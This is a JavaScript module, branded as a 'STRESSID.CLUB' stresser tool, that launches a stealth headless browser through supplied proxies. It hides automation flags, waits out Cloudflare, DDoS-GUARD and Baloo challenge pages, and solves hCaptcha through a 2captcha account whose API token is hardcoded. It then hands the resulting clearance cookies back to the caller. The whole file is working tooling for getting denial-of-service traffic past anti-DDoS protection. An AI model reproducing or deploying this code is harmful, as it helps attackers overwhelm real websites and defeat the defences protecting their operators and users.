require('events').EventEmitter.defaultMaxListeners = 0;
const puppeteer = require('puppeteer-extra')
const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');


function solving(message){
    return new Promise((resolve,reject) => {
        console.log(`[STRESSID.CLUB] Launch browser...`)
		console.log(`[STRESSID.CLUB] Target: ${message.url}`)
        puppeteer.use(StealthPlugin())
        puppeteer.use(RecaptchaPlugin({
            provider: {
                id:'2captcha',
                token:'484f6867edd89ad23af2d4cdfae8cbf5'
            },
            visualFeedback:true
        }))
        puppeteer.launch({
            headless: true,
			ignoreHTTPSErrors: true,
			ignoreDefaultArgs: [
				"--disable-extensions",
				"--enable-automation"
			],			
            args: [
                `--proxy-server=http://${message.proxy}`,
                '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
                '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
                `--window-size=1920,1080`,
                "--window-position=000,000",
                "--disable-dev-shm-usage",
				'--no-sandbox',
				'--disable-setuid-sandbox',
				'--disable-dev-shm-usage',
				'--disable-accelerated-2d-canvas',
				'--no-first-run',
				'--no-zygote',
				'--disable-gpu',
				'--hide-scrollbars',
				'--mute-audio',
				'--disable-gl-drawing-for-tests',
				'--disable-canvas-aa',
				'--disable-2d-canvas-clip-aa',
				'--disable-web-security',
				'--ignore-certificate-errors',
				'--ignore-certificate-errors-spki-list',
				'--disable-features=IsolateOrigins,site-per-process',
              ]
        }).then(async (browser) => {
            const page = await browser.newPage()
			console.log(`[STRESSID.CLUB] Function: Create a browser.`)
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.21');
            await page.setJavaScriptEnabled(true);
            await page.setDefaultNavigationTimeout(2400000);
            await page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => false
                });
            })
            await page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'platform', {
                    get: () => 'Win32'
                });
            })
            try {
                var admv = await page.goto(message.url)
            } catch (error) {
                await browser.close();			
            }
            try {
                const cloudFlareWrapper = await page.$('#cf-wrapper'); 
                if (cloudFlareWrapper) {
                    await page.waitForTimeout(25000, { waitUntil:'networkidle0' })
                    const maybecaptcha = await page.$('#cf-hcaptcha-container');
                    if (maybecaptcha) {
                        try {
							console.log(`[STRESSID.CLUB] Search captcha.`)
                            await page.waitForSelector('#cf-hcaptcha-container'); 
                            await page.solveRecaptchas();					
							console.log(`[STRESSID.CLUB | MODULE] Solve Recaptcha`)
                        } catch (e) {
                        }
                    }
                }
				
				const ddosguard = await page.title('DDOS-GUARD');
                if (ddosguard) {
                    await page.waitForTimeout(30000, { waitUntil:'networkidle0' })
					//await page.waitForNavigation();
                    const mbhcaptcha = await page.$('#hcaptcha');
                    if (mbhcaptcha) {
                        try {
							console.log(`[STRESSID.CLUB] Search captcha.`)
                            await page.waitForSelector('#hcaptcha'); 
                            await page.solveRecaptchas();					
							console.log(`[STRESSID.CLUB | MODULE] Solve Recaptcha`)
                        } catch (e) {
							
                        }
                    }
                }
				
				const baloo = await page.title('Baloo.one | Please wait a bit ...');
                if (baloo) {
                    await page.waitForTimeout(5000, { waitUntil:'networkidle0' })
                }				
				
                const cloudFlareWrapper2 = await page.$('#cf-wrapper'); 
                if (cloudFlareWrapper2) {
                    await page.waitForTimeout(30000, { waitUntil:'networkidle0' })
					//await page.waitForNavigation();
                    const maybecaptcha2 = await page.$('#cf-hcaptcha-container');
                    if (maybecaptcha2) {
                        try {
							console.log(`[STRESSID.CLUB] Search captcha.`)
                            await page.waitForSelector('#cf-hcaptcha-container');                          
                            await page.solveRecaptchas();
							console.log(`[STRESSID.CLUB | MODULE] Solve Recaptcha`)
                        } catch (e) {
							
                        }
                    }
                    await page.waitForTimeout(45000, { waitUntil: 'networkidle0' })
					//await page.waitForNavigation();
                    const cloudFlareWrapper3 = await page.$('#cf-wrapper'); 
                    if (cloudFlareWrapper3) {
						console.log(`[STRESSID.CLUB] Browser exit.`)
                        await browser.close();
                        reject();
                        return;
                    }
                }				
                const cookies = await page.cookies()
                if (cookies) {
                    resolve(cookies);
					const pagestitle = (await page.title()).toString().trim();
					console.log(`[STRESSID.CLUB] Title: ${pagestitle}`)
                    await browser.close();
                    return;
                }
            } catch (ee) { 
                reject(ee)
                await browser.close();
            }
        })
    })
}

module.exports = { solving:solving }
